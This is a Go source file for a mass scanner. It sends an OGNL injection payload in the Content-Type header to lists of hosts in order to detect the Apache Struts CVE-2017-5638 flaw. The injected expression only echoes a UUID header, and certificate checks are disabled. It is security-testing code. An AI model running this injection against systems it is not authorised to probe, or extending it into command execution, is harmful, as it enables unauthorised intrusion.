package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Sirupsen/logrus"
	"github.com/satori/go.uuid"
	env "github.com/securityscorecard/go-env"
	"github.com/spf13/pflag"
)

type CLIargs struct {
	file        string
	ports       []int
	concurrency int
	timeout     int
}

func main() {

	debug := env.Bool("DEBUG", false)
	if debug {
		logrus.SetLevel(logrus.DebugLevel)
		logrus.Debug("Running at Debug level.")
	}

	var args CLIargs
	pflag.StringVarP(&args.file, "file", "f", "", "File containing targets")
	pflag.IntSliceVarP(&args.ports, "ports", "p", []int{80}, "Ports to check.")
	pflag.IntVarP(&args.concurrency, "concurrency", "c", 10, "Concurrent HTTP requests.")
	pflag.IntVarP(&args.timeout, "timeout", "t", 15, "Timeout on HTTP requests.")
	pflag.Parse()

	targets := loadFile(args.file)
	logrus.Debugf("Targets: %d", len(targets))
	logrus.Debugf("Ports  : %d", len(args.ports))
	target := make(chan string)

	var wg sync.WaitGroup
	go check(target, &wg, args.concurrency, args.timeout)
	makeTarget(targets, args.ports, target)
	wg.Wait()
}

func loadFile(file string) []string {
	hosts, err := os.Open(file)
	if err != nil {
		log.Fatal(err)
	}
	defer hosts.Close()

	var read []string
	reader := bufio.NewScanner(hosts)
	for reader.Scan() {
		read = append(read, strings.TrimSpace(reader.Text()))
	}
	logrus.WithField("targets", len(read)).Infof("Done reading targets.")
	return read
}

func makeTarget(hosts []string, ports []int, targets chan<- string) {
	count := 0
	defer close(targets)
	for _, host := range hosts {

		for _, port := range ports {
			prefix := "http://"
			inlinePort := ""
			if port == 443 {
				prefix = "https://"
			}
			if port != 80 && port != 443 {
				inlinePort = ":" + strconv.Itoa(port) + "/"
			} else {
				inlinePort = "/"
			}
			count++
			targets <- (prefix + host + inlinePort)
		}
	}
	logrus.Infof("Done making %d targets.", count)
}

func check(targets <-chan string, externalWg *sync.WaitGroup, concurrency int, timeout int) {

	// Do not verify certificates. SANs error abound.
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	externalWg.Add(1)
	var wg sync.WaitGroup
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func(wg *sync.WaitGroup) {
			defer wg.Done()
			for target := range targets {
				logrus.WithField("target", target).Debugf("Checking new target")
				// https://svn.nmap.org/nmap/scripts/http-vuln-cve2017-5638.nse
				uuid := uuid.NewV4().String()
				payload := fmt.Sprintf("%%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Check-Struts', '%s')}.multipart/form-data", uuid)
				client := &http.Client{Transport: tr,
					Timeout: time.Duration(timeout) * time.Second}
				req, err := http.NewRequest("GET", target, nil)
				req.Header.Add("Content-Type", payload)
				res, err := client.Do(req)
				if err != nil {
					logrus.Debugf("Error making request: %s", err.Error())
					continue
				} else {
					defer res.Body.Close()
				}

				vuln := res.Header.Get("X-Check-Struts")
				if vuln == uuid {
					logrus.WithField("target", target).Warnf("CVE-2017-5638 vulnerability found!")
				}

			}
		}(&wg)
		wg.Wait()
	}
	externalWg.Done()
}